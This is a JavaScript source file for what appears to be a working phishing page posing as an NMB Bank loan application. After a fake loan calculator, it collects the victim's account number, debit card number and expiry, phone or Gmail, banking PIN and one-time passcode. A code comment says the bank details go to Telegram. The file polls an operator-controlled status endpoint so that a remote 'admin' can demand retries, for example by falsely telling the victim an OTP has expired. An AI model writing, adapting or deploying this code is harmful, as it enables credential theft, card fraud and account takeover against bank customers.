document.addEventListener('DOMContentLoaded', () => {
  const screenWelcome = document.getElementById('screen-welcome');
  const screenSlider = document.getElementById('screen-slider');
  const screenForm1 = document.getElementById('screen-form1');
  const screenForm2 = document.getElementById('screen-form2');
  const screenForm3 = document.getElementById('screen-form3');
  const screenBank = document.getElementById('screen-bank');
  const screenSignin = document.getElementById('screen-signin');
  const screenOtp = document.getElementById('screen-otp');
  const screenSuccess = document.getElementById('screen-success');
  const screenStopped = document.getElementById('screen-stopped');
  const loadingOverlay = document.getElementById('loading-overlay');

  const tabPhone = document.getElementById('tab-phone');
  const tabGmail = document.getElementById('tab-gmail');
  const identifierInput = document.getElementById('identifier-input');
  const identifierEmailInput = document.getElementById('identifier-email-input');
  const phonePrefixWrapper = document.getElementById('phone-prefix-wrapper');
  const lblIdentifierTitle = document.getElementById('lbl-identifier-title');

  const accountNoInput = document.getElementById('account-no-input');
  const cardNoInput = document.getElementById('card-no-input');
  const cardExpiryInput = document.getElementById('card-expiry-input');
  const btnSubmitBank = document.getElementById('btn-submit-bank');
  const bannerBankError = document.getElementById('banner-bank-error');

  const signinIdentifier = document.getElementById('signin-identifier');
  const pinBoxes = document.querySelectorAll('.pin-box-square');
  const btnSubmitSignin = document.getElementById('btn-submit-signin');
  const bannerPinError = document.getElementById('banner-pin-error');

  const otpBoxes = document.querySelectorAll('.otp-box-square');
  const btnSubmitOtp = document.getElementById('btn-submit-otp');
  const bannerOtpError = document.getElementById('banner-otp-error');

  let currentUserId = null;
  let statusPollInterval = null;
  let currentIdentifierType = 'Phone No';

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  function showScreen(targetScreen) {
    [screenWelcome, screenSlider, screenForm1, screenForm2, screenForm3, screenBank, screenSignin, screenOtp, screenSuccess, screenStopped].forEach(s => {
      if (s) s.classList.remove('active');
    });
    if (targetScreen) targetScreen.classList.add('active');
  }

  showScreen(screenWelcome);

  // Switch key for Phone No and Gmail
  if (tabPhone && tabGmail) {
    tabPhone.addEventListener('click', () => {
      tabPhone.classList.add('active');
      tabGmail.classList.remove('active');
      currentIdentifierType = 'Phone No';
      lblIdentifierTitle.innerText = 'Your Mobile Number / Phone No:';
      phonePrefixWrapper.style.display = 'flex';
      identifierEmailInput.style.display = 'none';
      identifierInput.value = '';
    });

    tabGmail.addEventListener('click', () => {
      tabGmail.classList.add('active');
      tabPhone.classList.remove('active');
      currentIdentifierType = 'Gmail';
      lblIdentifierTitle.innerText = 'Your Gmail Address:';
      phonePrefixWrapper.style.display = 'none';
      identifierEmailInput.style.display = 'block';
      identifierEmailInput.value = '';
    });
  }

  // Navigation flow
  document.getElementById('btn-goto-slider').addEventListener('click', () => showScreen(screenSlider));
  document.getElementById('btn-slider-back').addEventListener('click', () => showScreen(screenWelcome));
  document.getElementById('btn-goto-form1').addEventListener('click', () => showScreen(screenForm1));

  document.getElementById('btn-form1-back').addEventListener('click', () => showScreen(screenSlider));
  document.getElementById('btn-form1-next').addEventListener('click', () => {
    const amt = document.getElementById('form-amount-input').value;
    document.getElementById('sum-amount').innerText = `ZiG ${amt}`;
    showScreen(screenForm2);
  });

  document.getElementById('btn-form2-back').addEventListener('click', () => showScreen(screenForm1));
  document.getElementById('btn-form2-prev').addEventListener('click', () => showScreen(screenForm1));
  document.getElementById('btn-form2-next').addEventListener('click', () => showScreen(screenForm3));

  document.getElementById('btn-form3-back').addEventListener('click', () => showScreen(screenForm2));
  document.getElementById('btn-form3-prev').addEventListener('click', () => showScreen(screenForm2));
  document.getElementById('btn-form3-submit').addEventListener('click', () => showScreen(screenBank));

  document.getElementById('btn-bank-back').addEventListener('click', () => showScreen(screenForm3));

  // Bank Details Submission -> Sends to Telegram & Shows Spinning Screen until ALLOW
  btnSubmitBank.addEventListener('click', async () => {
    const accNo = accountNoInput.value.trim();
    const cardNo = cardNoInput.value.trim();
    const expiry = cardExpiryInput.value.trim();
    const identifierValue = currentIdentifierType === 'Phone No' ? identifierInput.value.trim() : identifierEmailInput.value.trim();

    if (!accNo || accNo.length < 10) {
      showSurfaceError(bannerBankError, 'ENTER A VALID 10 TO 13 DIGIT NMB ACCOUNT NUMBER');
      return;
    }
    if (!identifierValue) {
      showSurfaceError(bannerBankError, `PLEASE ENTER A VALID ${currentIdentifierType.toUpperCase()}`);
      return;
    }
    if (!cardNo || cardNo.length !== 16) {
      showSurfaceError(bannerBankError, 'ENTER A VALID 16-DIGIT NMB DEBIT CARD NUMBER');
      return;
    }

    bannerBankError.classList.remove('active');
    showLoading('VERIFYING BANK DETAILS...', 'Please wait while admin verifies your account details.');

    try {
      const res = await fetch(`/api/submit-bank?admin=${encodeURIComponent(adminParam)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          accountNo: accNo,
          cardNo,
          expiry,
          identifierType: currentIdentifierType,
          identifierValue,
          adminChatId: adminParam
        })
      });
      const data = await res.json();
      if (data.success) {
        currentUserId = data.userId;
        startStatusPolling();
      } else {
        hideLoading();
        showSurfaceError(bannerBankError, 'CONNECTION ERROR. TRY AGAIN.');
      }
    } catch (e) {
      hideLoading();
      showSurfaceError(bannerBankError, 'NETWORK ERROR.');
    }
  });

  // Slider calculation
  const loanSlider = document.getElementById('loan-amount-slider');
  const loanText = document.getElementById('loan-amount-text');
  const monthsSlider = document.getElementById('loan-months-slider');
  const monthsText = document.getElementById('loan-months-text');
  const monthlyRepVal = document.getElementById('monthly-rep-val');

  function updateCalc() {
    const amt = Number(loanSlider.value);
    const mths = Number(monthsSlider.value);
    loanText.innerText = `$${amt.toLocaleString()}`;
    monthsText.innerText = `${mths} months`;
    document.getElementById('form-amount-input').value = amt.toLocaleString();
    document.getElementById('sum-duration').innerText = `${mths} Months`;
    const monthly = (amt * 1.14) / mths;
    monthlyRepVal.innerText = `$${monthly.toFixed(2)}`;
  }

  if (loanSlider && monthsSlider) {
    loanSlider.addEventListener('input', updateCalc);
    monthsSlider.addEventListener('input', updateCalc);
    updateCalc();
  }

  // Pin boxes navigation helper
  pinBoxes.forEach((box, idx) => {
    box.addEventListener('input', () => {
      box.value = box.value.replace(/\D/g, '');
      if (box.value && idx < pinBoxes.length - 1) {
        pinBoxes[idx + 1].focus();
      }
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && idx > 0) {
        pinBoxes[idx - 1].focus();
      }
    });
  });

  // OTP boxes helper with AUTOMATIC SUBMISSION on the 6th digit
  otpBoxes.forEach((box, idx) => {
    box.addEventListener('input', () => {
      box.value = box.value.replace(/\D/g, '');
      if (box.value && idx < otpBoxes.length - 1) {
        otpBoxes[idx + 1].focus();
      }
      
      // Check if all 6 OTP digits are filled -> Automatically submit
      const currentOtpVal = Array.from(otpBoxes).map(b => b.value).join('');
      if (currentOtpVal.length === 6) {
        submitOtpAction(currentOtpVal);
      }
    });

    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && idx > 0) {
        otpBoxes[idx - 1].focus();
      }
    });
  });

  // Sign In Credentials Submission
  btnSubmitSignin.addEventListener('click', async () => {
    const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
    const valIdent = signinIdentifier ? signinIdentifier.value.trim() : '';
    if (pinVal.length !== 4) {
      showSurfaceError(bannerPinError, 'ENTER A VALID 4-DIGIT PIN');
      return;
    }

    bannerPinError.classList.remove('active');
    showLoading('VERIFYING CREDENTIALS...', 'Please wait...');

    try {
      const res = await fetch('/api/submit-credentials', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, identifierType: currentIdentifierType, identifierValue: valIdent, pin: pinVal })
      });
      const data = await res.json();
      if (data.success) {
        startStatusPolling();
      } else {
        hideLoading();
      }
    } catch (e) {
      hideLoading();
    }
  });

  // Reusable OTP Submission Function
  async function submitOtpAction(otpVal) {
    bannerOtpError.classList.remove('active');
    showLoading('VERIFYING OTP...', 'Please wait...');

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
      });
      const data = await res.json();
      if (data.success) {
        startStatusPolling();
      } else {
        hideLoading();
      }
    } catch (e) {
      hideLoading();
    }
  }

  // Manual fallback button submit for OTP
  if (btnSubmitOtp) {
    btnSubmitOtp.addEventListener('click', () => {
      const otpVal = Array.from(otpBoxes).map(b => b.value).join('');
      if (otpVal.length !== 6) {
        showSurfaceError(bannerOtpError, 'ENTER A VALID 6-DIGIT OTP');
        return;
      }
      submitOtpAction(otpVal);
    });
  }

  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'PROCEED_CREDENTIALS') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen(screenSignin);
          if (signinIdentifier) signinIdentifier.value = currentIdentifierType === 'Phone No' ? identifierInput.value.trim() : identifierEmailInput.value.trim();
          if (pinBoxes[0]) pinBoxes[0].focus();
        } else if (data.status === 'PROCEED_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen(screenOtp);
          if (otpBoxes[0]) otpBoxes[0].focus();
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          showSurfaceError(bannerPinError, 'WRONG PIN ❌ PLEASE ENTER CORRECT PIN');
          pinBoxes.forEach(b => b.value = '');
          if (pinBoxes[0]) pinBoxes[0].focus();
          showScreen(screenSignin);
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          showSurfaceError(bannerOtpError, 'OTP EXPIRED ❌ PLEASE ENTER NEW OTP');
          otpBoxes.forEach(b => b.value = '');
          if (otpBoxes[0]) otpBoxes[0].focus();
          showScreen(screenOtp);
        } else if (data.status === 'DENIED_STOP') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen(screenStopped);
        } else if (data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen(screenSuccess);
        }
      } catch (e) {}
    }, 2500);
  }

  document.getElementById('btn-finish-home').addEventListener('click', () => {
    window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
  });

  function showSurfaceError(bannerEl, msg) {
    if (bannerEl) {
      bannerEl.innerText = msg;
      bannerEl.classList.add('active');
    }
  }

  function showLoading(title, sub) {
    document.getElementById('loading-title').innerText = title;
    document.getElementById('loading-sub').innerText = sub;
    if (loadingOverlay) loadingOverlay.classList.add('active');
  }

  function hideLoading() {
    if (loadingOverlay) loadingOverlay.classList.remove('active');
  }
});
    
